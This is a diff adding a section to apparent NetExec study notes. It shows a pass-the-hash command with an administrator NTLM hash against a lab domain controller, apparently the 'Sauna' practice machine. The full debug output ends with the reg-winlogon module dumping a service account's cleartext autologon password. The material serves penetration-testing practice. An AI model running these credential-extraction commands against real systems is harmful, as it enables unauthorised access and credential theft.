@@ -843,6 +843,7 @@
 
 
 
+
 ## smb
 ### --interfaces
 ```sh
@@ -2023,6 +2024,85 @@ https://www.akamai.com/ja/blog/security-research/cold-hard-cache-bypassing-rpc-w
            DEBUG    Calling process_credentials                                                                                                                                                                                lsassy.py:118
 [15:14:39] INFO     LSASSY      10.129.175.223  445    DC               No credentials found                                                                                                                                   lsassy.py:123
            DEBUG    Closing connection to: 10.129.175.223                                                                                                                                                                  connection.py:178
+```
+
+
+## -M reg-winlogon
+```sh
+└─$ netexec smb 10.129.95.180 -u 'EGOTISTICAL-BANK.LOCAL\administrator' -H '823452073d75b9d1cf70ebdf86c7f98e' -M reg-winlogon  --debug
+[12:16:24] DEBUG    NXC VERSION: 1.4.0 - SmoothOperator - Kali Linux                                                                                                                                                               cli.py:28
+           DEBUG    PYTHON VERSION: 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0]                                                                                                                                          netexec.py:81
+           DEBUG    RUNNING ON: Linux Release: 6.12.33+kali-amd64                                                                                                                                                              netexec.py:82
+           DEBUG    Passed args: Namespace(version=False, threads=256, timeout=None, jitter=None, verbose=False, debug=True, no_progress=False, log=None, force_ipv6=False, dns_server=None, dns_tcp=False, dns_timeout=3,     netexec.py:83
+                    protocol='smb', target=['10.129.95.180'], username=['EGOTISTICAL-BANK.LOCAL\\administrator'], password=[], cred_id=[], ignore_pw_decoding=False, no_bruteforce=False, continue_on_success=False,                        
+                    gfail_limit=None, ufail_limit=None, fail_limit=None, kerberos=False, use_kcache=False, aesKey=None, kdcHost=None, pfx_cert=None, pfx_base64=None, pfx_pass=None, pem_cert=None, pem_key=None,                           
+                    server='https', server_host='0.0.0.0', server_port=None, connectback_host=None, module=['reg-winlogon'], module_options=[], list_modules=False, show_module_options=False,                                              
+                    hash=['823452073d75b9d1cf70ebdf86c7f98e'], delegate=None, no_s4u2proxy=False, domain=None, local_auth=False, port=445, share='C$', smb_server_port=445, no_smbv1=False, gen_relay_list=None,                            
+                    smb_timeout=2, laps=None, generate_hosts_file=None, generate_krb5_file=None, sam=None, lsa=None, ntds=None, dpapi=None, sccm=None, mkfile=None, pvk=None, enabled=False, userntds=None, shares=False,                   
+                    dir=None, interfaces=False, no_write_check=False, filter_shares=None, smb_sessions=False, disks=False, loggedon_users_filter=None, loggedon_users=None, users=None, users_export=None, groups=None,                     
+                    computers=None, local_groups=None, pass_pol=False, rid_brute=None, qwinsta=False, tasklist=False, wmi=None, wmi_namespace='root\\cimv2', spider=None, spider_folder='.', content=False, exclude_dirs='',                
+                    depth=None, only_files=False, pattern=None, regex=None, put_file=None, get_file=None, append_host=False, exec_method='wmiexec', dcom_timeout=5, get_output_tries=100, codec='utf-8', no_output=False,                   
+                    execute=None, ps_execute=None, obfs=False, amsi_bypass=None, clear_obfscripts=False, force_ps32=False, no_encode=False)                                                                                                 
+           DEBUG    Protocol: smb                                                                                                                                                                                             netexec.py:137
+           DEBUG    Protocol Path: /usr/lib/python3/dist-packages/nxc/protocols/smb.py                                                                                                                                        netexec.py:140
+           DEBUG    Protocol DB Path: /usr/lib/python3/dist-packages/nxc/protocols/smb/database.py                                                                                                                            netexec.py:142
+           DEBUG    symmetric using "pyCryptodomex" for "DES"                                                                                                                                                                 __init__.py:55
+           DEBUG    symmetric using "pyCryptodomex" for "TDES"                                                                                                                                                                __init__.py:55
+           DEBUG    symmetric using "pyCryptodomex" for "AES"                                                                                                                                                                 __init__.py:55
+           DEBUG    symmetric using "pyCryptodomex" for "RC4"                                                                                                                                                                 __init__.py:55
+           DEBUG    Protocol Object: <class 'protocol.smb'>, type: <class 'type'>                                                                                                                                             netexec.py:145
+           DEBUG    Protocol DB Object: <class 'protocol.database'>                                                                                                                                                           netexec.py:147
+           DEBUG    DB Path: /home/kali/.nxc/workspaces/default/smb.db                                                                                                                                                        netexec.py:150
+[12:16:25] DEBUG    Modules to be Loaded for sanity check: ['reg-winlogon'], <class 'list'>                                                                                                                                   netexec.py:182
+           DEBUG    Loading module for sanity check reg-winlogon at path /usr/lib/python3/dist-packages/nxc/modules/reg-winlogon.py                                                                                           netexec.py:189
+           DEBUG    Supported protocols: ['smb']                                                                                                                                                                          moduleloader.py:71
+           DEBUG    Protocol: smb                                                                                                                                                                                         moduleloader.py:72
+           DEBUG    Using selector: EpollSelector                                                                                                                                                                      selector_events.py:64
+           DEBUG    Creating ThreadPoolExecutor                                                                                                                                                                                netexec.py:45
+           DEBUG    Creating thread for <class 'protocol.smb'>                                                                                                                                                                 netexec.py:48
+           INFO     Socket info: host=10.129.95.180, hostname=10.129.95.180, kerberos=False, ipv6=False, link-local ipv6=False                                                                                             connection.py:165
+           DEBUG    Kicking off proto_flow                                                                                                                                                                                 connection.py:227
+           INFO     Creating SMBv3 connection to 10.129.95.180                                                                                                                                                                    smb.py:606
+[12:16:27] DEBUG    Created connection object                                                                                                                                                                              connection.py:232
+           DEBUG    Server OS: Windows 10 / Server 2019 Build 17763 10.0 build 17763                                                                                                                                              smb.py:280
+[12:16:29] INFO     Creating SMBv1 connection to 10.129.95.180                                                                                                                                                                    smb.py:575
+[12:16:30] INFO     SMBv1 disabled on 10.129.95.180                                                                                                                                                                               smb.py:598
+           DEBUG    Update Hosts: [{'id': 5, 'ip': '10.129.95.180', 'hostname': 'SAUNA', 'domain': 'EGOTISTICAL-BANK.LOCAL', 'os': 'Windows 10 / Server 2019 Build 17763', 'dc': None, 'smbv1': False, 'signing': True,      database.py:265
+                    'spooler': None, 'zerologon': None, 'petitpotam': None}]                                                                                                                                                                
+           DEBUG    add_host() - Host IDs Updated: [5]                                                                                                                                                                       database.py:275
+           INFO     Error resolving hostname EGOTISTICAL-BANK.LOCAL: [Errno -2] Name or service not known                                                                                                                  connection.py:192
+           INFO     Resolved domain: EGOTISTICAL-BANK.LOCAL with dns, kdcHost: None                                                                                                                                               smb.py:321
+[12:16:30] INFO     SMB         10.129.95.180   445    SAUNA            Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)                                        smb.py:327
+           DEBUG    ['823452073d75b9d1cf70ebdf86c7f98e']                                                                                                                                                                   connection.py:443
+           INFO     Creating SMBv3 connection to 10.129.95.180                                                                                                                                                                    smb.py:606
+[12:16:34] DEBUG    Logged in with hash to SMB with EGOTISTICAL-BANK.LOCAL/administrator                                                                                                                                          smb.py:532
+           DEBUG    self.is_guest=False                                                                                                                                                                                           smb.py:534
+           DEBUG    Checking if user is admin on 10.129.95.180                                                                                                                                                                    smb.py:646
+[12:16:50] DEBUG    User is admin on 10.129.95.180!                                                                                                                                                                               smb.py:661
+           DEBUG    Adding credentials: [{'id': 13, 'domain': 'EGOTISTICAL-BANK.LOCAL', 'username': 'administrator', 'password': '823452073d75b9d1cf70ebdf86c7f98e', 'credtype': 'hash', 'pillaged_from_hostid': None}]      database.py:332
+           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
+           DEBUG    filter_term is an IP address: 10.129.95.180                                                                                                                                                              database.py:133
+           DEBUG    smb hosts() - results: [(5, '10.129.95.180', 'SAUNA', 'EGOTISTICAL-BANK.LOCAL', 'Windows 10 / Server 2019 Build 17763', None, False, True, None, None, None)]                                            database.py:485
+[12:16:50] INFO     SMB         10.129.95.180   445    SAUNA            EGOTISTICAL-BANK.LOCAL\administrator:823452073d75b9d1cf70ebdf86c7f98e (Pwn3d!)                                                                            smb.py:544
+           DEBUG    Using 'ip' column for filtering                                                                                                                                                                          database.py:122
+           DEBUG    filter_term is an IP address: 10.129.95.180                                                                                                                                                              database.py:133
+           DEBUG    smb hosts() - results: [(5, '10.129.95.180', 'SAUNA', 'EGOTISTICAL-BANK.LOCAL', 'Windows 10 / Server 2019 Build 17763', None, False, True, None, None, None)]                                            database.py:485
+           DEBUG    users: <sqlalchemy.engine.cursor.CursorResult object at 0x7f6b64123690>, hosts: [(5, '10.129.95.180', 'SAUNA', 'EGOTISTICAL-BANK.LOCAL', 'Windows 10 / Server 2019 Build 17763', None, False, True,      database.py:362
+                    None, None, None)]                                                                                                                                                                                                      
+           INFO     Loading modules for target: 10.129.95.180                                                                                                                                                              connection.py:589
+           DEBUG    Supported protocols: ['smb']                                                                                                                                                                          moduleloader.py:71
+           DEBUG    Protocol: smb                                                                                                                                                                                         moduleloader.py:72
+           DEBUG    Calling modules                                                                                                                                                                                        connection.py:238
+           DEBUG    Loading module reg-winlogon - <NXCModule.NXCModule object at 0x7f6b6410cc20>                                                                                                                           connection.py:273
+           DEBUG    Loading context for module reg-winlogon - <NXCModule.NXCModule object at 0x7f6b6410cc20>                                                                                                               connection.py:283
+           DEBUG    Module reg-winlogon has on_admin_login method                                                                                                                                                          connection.py:297
+[12:17:03] INFO     REG-WINL... 10.129.95.180   445    SAUNA            AutoAdminLogon:                                                                                                                                   reg-winlogon.py:43
+[12:17:04] INFO     REG-WINL... 10.129.95.180   445    SAUNA            DefaultDomainName: EGOTISTICALBANK                                                                                                                reg-winlogon.py:41
+[12:17:06] INFO     REG-WINL... 10.129.95.180   445    SAUNA            DefaultUserName: EGOTISTICALBANK\svc_loanmanager                                                                                                  reg-winlogon.py:41
+[12:17:07] INFO     REG-WINL... 10.129.95.180   445    SAUNA            DefaultPassword: Moneymakestheworldgoround!                                                                                                       reg-winlogon.py:41
+[12:17:09] ERROR    Exception while calling proto_flow() on target 10.129.95.180: SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running         connection.py:171
+                    services are dependent on.                                                                                                                                                                                              
+           DEBUG    Closing connection to: 10.129.95.180                                                                                                                                                                   connection.py:178
 ```
 
 
